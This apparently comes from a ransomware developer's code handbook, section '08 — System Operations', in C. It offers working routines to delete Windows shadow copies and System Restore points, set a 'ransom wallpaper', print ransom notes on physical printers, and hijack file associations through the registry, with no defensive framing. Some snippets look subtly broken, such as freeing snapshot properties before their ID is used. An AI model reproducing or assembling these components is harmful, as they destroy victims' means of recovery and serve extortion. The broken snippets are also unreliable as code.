# 08 — System Operations

## Shadow Copy Deletion via VSS COM API
```c
#include <vss.h>
#include <vswriter.h>
#include <vsbackup.h>
#pragma comment(lib, "vssapi.lib")

BOOL DeleteShadowCopiesViaVss(PDWORD pdwDeleted) {
    *pdwDeleted = 0;
    CoInitialize(NULL);
    CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL);

    IVssBackupComponents* pBackup = NULL;
    CreateVssBackupComponents(&pBackup);
    pBackup->InitializeForBackup(NULL);
    pBackup->SetContext(VSS_CTX_ALL);
    pBackup->SetBackupState(TRUE, TRUE, VSS_BT_FULL, FALSE);

    IVssEnumObject* pEnum = NULL;
    pBackup->Query(GUID_NULL, VSS_OBJECT_NONE, VSS_OBJECT_SNAPSHOT, &pEnum);

    VSS_OBJECT_PROP prop; ULONG ulFetched;
    while (pEnum->Next(1, &prop, &ulFetched) == S_OK) {
        LONG lCount; VSS_ID nonDel;
        VssFreeSnapshotPropertiesInternal(&prop.Obj.Snap);
        pBackup->DeleteSnapshots(prop.Obj.Snap.m_SnapshotId, VSS_OBJECT_SNAPSHOT, TRUE, &lCount, &nonDel);
        (*pdwDeleted)++;
    }

    pEnum->Release(); pBackup->Release();
    CoUninitialize();
    return TRUE;
}
```

## Restore Point Deletion via WMI
```c
typedef DWORD(WINAPI* fnSRRemoveRestorePoint)(DWORD);

BOOL DeleteRestorePointsViaWmi(PDWORD pdwDeleted) {
    *pdwDeleted = 0;
    HMODULE hSrc = LoadLibraryA("SRCLIENT.DLL");
    if (!hSrc) return FALSE;
    fnSRRemoveRestorePoint pRemove = (fnSRRemoveRestorePoint)GetProcAddress(hSrc, "SRRemoveRestorePoint");
    if (!pRemove) { FreeLibrary(hSrc); return FALSE; }

    CoInitializeEx(0, COINIT_MULTITHREADED);
    CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT,
        RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);

    IWbemLocator* pLoc = NULL; IWbemServices* pSvc = NULL;
    CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (LPVOID*)&pLoc);
    pLoc->ConnectServer(L"ROOT\\DEFAULT", NULL, NULL, 0, 0, 0, 0, &pSvc);
    CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

    IEnumWbemClassObject* pEnumerator = NULL;
    pSvc->ExecQuery(L"WQL", L"SELECT * FROM SystemRestore",
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnumerator);

    IWbemClassObject* pObj = NULL; ULONG uRet = 0;
    while (pEnumerator->Next(WBEM_INFINITE, 1, &pObj, &uRet) == S_OK) {
        VARIANT vtSeq; VariantInit(&vtSeq);
        pObj->Get(L"SequenceNumber", 0, &vtSeq, NULL, NULL);
        pRemove(vtSeq.uintVal);
        VariantClear(&vtSeq);
        pObj->Release();
        (*pdwDeleted)++;
    }

    pEnumerator->Release(); pSvc->Release(); pLoc->Release();
    CoUninitialize(); FreeLibrary(hSrc);
    return TRUE;
}
```

## LOLBin Shadow Copy Deletion (one-liners)
```c
```

---

## Wallpaper Change
```c
BOOL SetRansomWallpaper(LPCWSTR szImagePath) {
    return SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)szImagePath,
        SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}
```

## Print BMP via GDI (physical printer)
```c
BOOL PrintBmpImage(LPCWSTR szPrinterName, DWORD dwBitmapResourceId) {
    HBITMAP hBmp = LoadBitmapW(GetModuleHandle(NULL), MAKEINTRESOURCE(dwBitmapResourceId));
    BITMAP bm; GetObject(hBmp, sizeof(BITMAP), &bm);

    HDC hdcPrinter = CreateDCW(L"WINSPOOL", szPrinterName, NULL, NULL);
    DOCINFOW di = { sizeof(DOCINFOW), L"Document", NULL, NULL, 0 };
    StartDocW(hdcPrinter, &di); StartPage(hdcPrinter);

    HDC hdcMem = CreateCompatibleDC(hdcPrinter);
    SelectObject(hdcMem, hBmp);
    StretchBlt(hdcPrinter, 0, 0,
        GetDeviceCaps(hdcPrinter, HORZRES), GetDeviceCaps(hdcPrinter, VERTRES),
        hdcMem, 0, 0, bm.bmWidth, bm.bmHeight, SRCCOPY);

    EndPage(hdcPrinter); EndDoc(hdcPrinter);
    DeleteDC(hdcMem); DeleteDC(hdcPrinter); DeleteObject(hBmp);
    return TRUE;
}
```

## Print ASCII Text (via Spooler API)
```c
BOOL PrintAsciiText(LPCSTR szPrinterName, LPCSTR szText, DWORD dwTextLen) {
    HANDLE hPrinter = NULL;
    if (!OpenPrinterA((LPSTR)szPrinterName, &hPrinter, NULL)) return FALSE;

    DOC_INFO_1A doc = { .pDocName = "Note", .pOutputFile = NULL, .pDatatype = "TEXT" };
    StartDocPrinterA(hPrinter, 1, (LPBYTE)&doc);
    StartPagePrinter(hPrinter);
    DWORD dwW = 0;
    WritePrinter(hPrinter, (LPVOID)szText, dwTextLen, &dwW);
    EndPagePrinter(hPrinter); EndDocPrinter(hPrinter); ClosePrinter(hPrinter);
    return TRUE;
}
```

## Printer Enumeration (find physical printers)
```c
BOOL FindPhysicalPrinters(void) {
    DWORD dwNeeded = 0, dwCount = 0;
    EnumPrintersW(PRINTER_ENUM_LOCAL | PRINTER_ENUM_CONNECTIONS, NULL, 2, NULL, 0, &dwNeeded, &dwCount);
    PBYTE pBuf = (PBYTE)LocalAlloc(LPTR, dwNeeded);
    EnumPrintersW(PRINTER_ENUM_LOCAL | PRINTER_ENUM_CONNECTIONS, NULL, 2, pBuf, dwNeeded, &dwNeeded, &dwCount);
    PRINTER_INFO_2W* pInfo = (PRINTER_INFO_2W*)pBuf;
    for (DWORD i = 0; i < dwCount; i++) {
        if (pInfo[i].Attributes & (PRINTER_ATTRIBUTE_LOCAL | PRINTER_ATTRIBUTE_ENABLE_BIDI)) {
        }
    }
    LocalFree(pBuf);
    return TRUE;
}
```

---

## File Association Registry Hijack
```c
BOOL SetFileAssociation(LPCWSTR szExt, LPCWSTR szProgId, LPCWSTR szAppPath, int iIconIndex) {
    HKEY hKeyExt = NULL, hKeyProg = NULL, hKeyIcon = NULL, hKeyCmd = NULL;
    WCHAR szIconVal[MAX_PATH], szCmdVal[MAX_PATH];

    RegCreateKeyExW(HKEY_CLASSES_ROOT, szExt, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKeyExt, NULL);
    RegSetValueExW(hKeyExt, NULL, 0, REG_SZ, (BYTE*)szProgId, (DWORD)(wcslen(szProgId)+1)*sizeof(WCHAR));
    RegCloseKey(hKeyExt);

    WCHAR szIconPath[MAX_PATH]; wsprintfW(szIconPath, L"%s\\DefaultIcon", szProgId);
    RegCreateKeyExW(HKEY_CLASSES_ROOT, szIconPath, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKeyIcon, NULL);
    wsprintfW(szIconVal, L"%s,%d", szAppPath, iIconIndex);
    RegSetValueExW(hKeyIcon, NULL, 0, REG_SZ, (BYTE*)szIconVal, (DWORD)(wcslen(szIconVal)+1)*sizeof(WCHAR));
    RegCloseKey(hKeyIcon);

    WCHAR szCmdPath[MAX_PATH]; wsprintfW(szCmdPath, L"%s\\shell\\open\\command", szProgId);
    RegCreateKeyExW(HKEY_CLASSES_ROOT, szCmdPath, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKeyCmd, NULL);
    wsprintfW(szCmdVal, L"\"%s\" \"%%1\"", szAppPath);
    RegSetValueExW(hKeyCmd, NULL, 0, REG_SZ, (BYTE*)szCmdVal, (DWORD)(wcslen(szCmdVal)+1)*sizeof(WCHAR));
    RegCloseKey(hKeyCmd);

    return TRUE;
}
```

## Registry Read/Write Helpers
```c
BOOL WriteRegBinary(HKEY hRoot, LPCSTR szSubKey, LPCSTR szName, PBYTE pData, DWORD dwSize) {
    HKEY hKey = NULL;
    RegCreateKeyExA(hRoot, szSubKey, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    RegSetValueExA(hKey, szName, 0, REG_BINARY, pData, dwSize);
    RegCloseKey(hKey);
    return TRUE;
}

BOOL ReadRegBinary(HKEY hRoot, LPCSTR szSubKey, LPCSTR szName, PBYTE* ppData, PDWORD pdwSize) {
    *pdwSize = 0;
    RegGetValueA(hRoot, szSubKey, szName, RRF_RT_ANY, NULL, NULL, pdwSize);
    *ppData = (PBYTE)LocalAlloc(LPTR, *pdwSize);
    return (RegGetValueA(hRoot, szSubKey, szName, RRF_RT_ANY, NULL, *ppData, pdwSize) == ERROR_SUCCESS);
}
```
